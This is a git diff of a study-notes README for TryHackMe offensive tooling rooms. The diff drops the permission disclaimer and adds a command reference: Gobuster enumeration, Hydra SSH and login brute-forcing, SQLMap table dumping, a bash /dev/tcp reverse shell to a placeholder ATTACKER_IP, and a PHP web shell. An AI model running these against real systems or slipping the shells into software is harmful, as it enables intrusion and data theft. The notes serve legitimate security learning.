@@ -1,59 +1,124 @@
-# 🛠️ Offensive Security Tooling
+# 🗺️ Offensive Security Tooling
 
-> **This section of the Cyber Security 101 path covers the core tools used in real-world penetration testing.**  
-> From enumeration to brute-forcing, from shells to SQL injection — each tool has its role in an attacker's arsenal. 💀
+> This section of the **Cyber-Security-101 Path** covers the core offensive tools used by penetration testers in real-world security assessments.
 
 ---
 
 ## 📁 Rooms Covered
 
-| # | Room | What You Learn | Status |
-|---|------|---------------|--------|
-| 1 | 🔍 [Gobuster: The Basics](./Gobuster:%20The%20Basics/) | Directory & DNS enumeration, wordlists, HTTP status codes | ✅ Done |
-| 2 | 🔐 [Hydra](./Hydra/) | SSH & HTTP brute-forcing, rockyou.txt, login attacks | ✅ Done |
-| 3 | 🐚 [Shell Overview](./Shell-Overview/) | Reverse shells, bind shells, web shells, netcat listeners | ✅ Done |
-| 4 | 💉 [SQLMap: The Basics](./SQLMap:The-Basics/) | SQL injection automation, database enumeration, data dumping | ✅ Done |
+| # | Room | Topic | Status |
+|---|------|--------|--------|
+| 1 | 🔍 Gobuster: The Basics | Directory & DNS Enumeration | ✅ Done |
+| 2 | 💧 Hydra | Brute-Force Attacks | ✅ Done |
+| 3 | 🗄️ SQLMap: The Basics | Automated SQL Injection | ✅ Done |
+| 4 | 🐚 Shell Overview | Reverse, Bind & Web Shells | ✅ Done |
 
 ---
 
-## 🧠 Tools at a Glance
+## 🧠 Why This Section Matters
 
-| Tool | What It Does | Real-World Use |
-|------|-------------|----------------|
-| **Gobuster** | Discovers hidden files, directories, and subdomains | Web server enumeration during recon phase |
-| **Hydra** | Brute-forces credentials across multiple protocols | Attacking login pages, SSH, FTP services |
-| **Netcat / Shells** | Establishes remote command execution (reverse or bind) | Gaining and maintaining access to a target |
-| **SQLMap** | Automatically detects and exploits SQL injection flaws | Extracting data from vulnerable databases |
+> **Think of it this way:** If cybersecurity is a war, these tools are your **arsenal**. Each one has a specific mission in an offensive engagement.
 
----
-
-## 🎯 What is Offensive Security Tooling?
-
-> Think of it this way: if **network scanning** tools (Nmap, Wireshark) answer *"what's running?"* —  
-> then **offensive tools** answer *"how do we get in?"* 🎭
-
-These tools cover the core phases of a penetration test:
-
-- 🔍 **Enumeration** → mapping the attack surface (Gobuster)
-- 🔓 **Credential Attacks** → cracking weak or default passwords (Hydra)
-- 🐚 **Post-Exploitation** → maintaining access after a foothold (Shells)
-- 💉 **Injection Attacks** → exploiting vulnerable databases (SQLMap)
+```
+Gobuster  →  Find the enemy's hidden locations (enumeration)
+Hydra     →  Break down the door (brute-force)
+SQLMap    →  Extract secrets from the database (SQL injection)
+Shells    →  Plant your flag on the target machine (remote access)
+```
 
 ---
 
-## ⚠️ Disclaimer
+## 🔍 Quick Tool Reference
 
-> These notes are strictly for **educational purposes**.  
-> Only use these tools on **systems you own or have explicit permission to test** (e.g. TryHackMe labs).  
-> Unauthorized use is illegal. 🚫
+### 🔎 Gobuster — Directory Enumerator
+Discovers **hidden files, directories, DNS subdomains, and virtual hosts** on a target using wordlists.
+
+```bash
+gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
+gobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt
+gobuster vhost -u http://target.com -w wordlist.txt
+```
+
+**Key flags:** `-u` (URL) · `-w` (wordlist) · `-x` (file extensions) · `-t` (threads)
 
 ---
 
-## 🔗 Related Sections
+### 💧 Hydra — Brute-Force Tool
+Cracks credentials across many protocols — SSH, HTTP, FTP, RDP, and more.
 
-- [← Cyber Security 101](../README.md)
-- [→ Jr Penetration Tester Path](../../Jr-Penetration-Tester/README.md)
+```bash
+# SSH brute-force
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com
+
+# HTTP POST login form
+hydra -l admin -P rockyou.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
+```
+
+**Key flags:** `-l` (single username) · `-L` (username list) · `-p` (single password) · `-P` (password list)
 
 ---
 
-*Made with 💻 by [alimirza2412](https://github.com/alimirza2412) | TryHackMe: [Muhammad.Ali12](https://tryhackme.com/p/Muhammad.Ali12)*
+### 🗄️ SQLMap — SQL Injection Automator
+Automatically detects and exploits **SQL injection vulnerabilities** to extract database contents.
+
+```bash
+# Basic scan
+sqlmap -u "http://target.com/page?id=1"
+
+# List all databases
+sqlmap -u "http://target.com/page?id=1" --dbs
+
+# Dump a specific table
+sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump
+```
+
+**Key flags:** `-u` (target URL) · `--dbs` (list databases) · `-D` (select database) · `-T` (select table) · `--dump` (extract data)
+
+---
+
+### 🐚 Shell Overview — Remote Access
+Gain **command execution** on a target machine via reverse shells, bind shells, or web shells.
+
+```bash
+# Netcat listener (attacker machine)
+nc -lvnp 4444
+
+# Reverse shell one-liner (victim machine)
+bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+
+# Web shell (PHP)
+<?php echo shell_exec($_GET['cmd']); ?>
+```
+
+**Shell Types:**
+
+| Type | Connection Direction | Common Use Case |
+|------|----------------------|-----------------|
+| Reverse Shell | Victim → Attacker | Bypassing firewalls |
+| Bind Shell | Attacker → Victim | Direct inbound access |
+| Web Shell | Browser → Web Server | File upload exploitation |
+
+---
+
+## 🔗 Room Links
+
+- [Gobuster: The Basics](https://tryhackme.com/room/gobusterthebasics)
+- [Hydra](https://tryhackme.com/room/hydra)
+- [SQLMap: The Basics](https://tryhackme.com/room/sqlmapthebasics)
+- [Shell Overview](https://tryhackme.com/room/shelloverview)
+
+---
+
+## 📊 Skills Gained
+
+```
+✅ Web enumeration & hidden directory discovery
+✅ Credential brute-forcing across multiple protocols
+✅ SQL injection detection & database dumping
+✅ Reverse, bind, and web shell deployment
+✅ Netcat listener setup & shell stabilization
+```
+
+---
+
+*Part of [Cyber-Security-101](../README.md) path · [Back to Main Repo](../../README.md)*
